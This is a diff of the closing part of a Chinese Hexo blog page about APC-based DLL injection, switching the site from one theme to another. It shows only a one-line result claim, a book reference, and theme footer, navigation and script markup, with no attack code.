+<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。</p>
-<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png"></p>
+<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>
 
-      
-    </div>
-    <div class="article-footer">
-      <blockquote class="mt-2x">
-  <ul class="post-copyright list-unstyled">
-    
-    <li class="post-copyright-link hidden-xs">
-      <strong>本文链接：</strong>
-      <a href="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/" title="注入技术-APC注入" target="_blank" rel="external">https://b1ack1e.github.io/2021/07/13/注入技术-APC注入/</a>
-    </li>
-    
-    <li class="post-copyright-license">
-      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li>
-  </ul>
-</blockquote>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">黑客编程</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">恶意代码</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">黑客编程</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/14/160CrackMe-001/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">160CrackMe--001</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">注入技术-突破session 0隔离的远线程注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-
-<div class="panel panel-default panel-badger">
-  <div class="panel-body">
-    <figure class="media">
-      <div class="media-left">
-        <a href="https://github.com/B1ack1e" target="_blank" class="img-burn thumb-sm visible-lg">
-          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
-        </a>
-      </div>
-      <div class="media-body">
-        <h3 class="media-heading"><a href="https://github.com/B1ack1e" target="_blank"><span class="text-dark">b1ackie</span><small class="ml-1x"></small></a></h3>
-        <div></div>
-      </div>
-    </figure>
-  </div>
-</div>
-
-
-    </div>
-  </article>
-  
-    
-  <section id="comments">
-  	
-      <div id="vcomments"></div>
-    
-  </section>
-
-
-  
-</div>
-
-  <nav class="bar bar-footer clearfix" data-stick-bottom>
-  <div class="bar-inner">
-  
-  <ul class="pager pull-left">
-    
-    <li class="prev">
-      <a href="/2021/07/14/160CrackMe-001/" title="160CrackMe--001"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
-    
-    <li class="next">
-      <a href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="注入技术-突破session 0隔离的远线程注入"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
-    </li>
-    
-    
-  </ul>
-  
-  
-  
-  <div class="bar-right">
-    
-    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
-    
-  </div>
-  </div>
-</nav>
-  
-
-
-</main>
-
-  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
-	
-	
-    <ul class="social-links">
-    	
-        <li><a href="https://github.com/B1ack1e" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
-        
-    </ul>
-
-    <div class="copyright">
-    	
-        <div class="publishby">
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+            
+          </article>
         </div>
+      </div>
     </div>
-</footer>
-  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
-<script>
-window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
-</script>
-
-<script src="/js/plugin.min.js"></script>
-
-
-<script src="/js/application.js"></script>
-
-
-    <script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(未命名)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '/content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-
-<script src="/js/insight.js"></script>
-
-
-
-
-
-
-   
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-
-   
     
-  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/valine"></script>
-  <script type="text/javascript">
-  var GUEST = ['nick', 'mail', 'link'];
-  var meta = 'nick,mail,link';
-  meta = meta.split(',').filter(function(item) {
-    return GUEST.indexOf(item) > -1;
-  });
-  new Valine({
-    el: '#vcomments',
-    verify: false,
-    notify: false,
-    appId: '',
-    appKey: '',
-    placeholder: 'Just go go',
-    avatar: 'mm',
-    meta: meta,
-    pageSize: '10' || 10,
-    visitor: false
-  });
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
   </script>
 
-     
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
 
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
 
 
 </body>
